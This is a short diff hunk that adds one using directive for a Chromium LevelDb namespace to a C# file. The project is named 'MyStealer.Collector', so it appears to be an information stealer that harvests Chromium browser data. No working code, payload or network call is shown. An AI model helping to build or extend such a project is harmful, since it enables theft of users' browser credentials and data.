@@ -1,5 +1,6 @@
 ﻿using MyStealer.Collector.Utils;
 using MyStealer.Collector.Utils.Chromium;
+using MyStealer.Collector.Utils.Chromium.LevelDb;
 using Newtonsoft.Json.Linq;
 using System;
 using System.Collections.Generic;
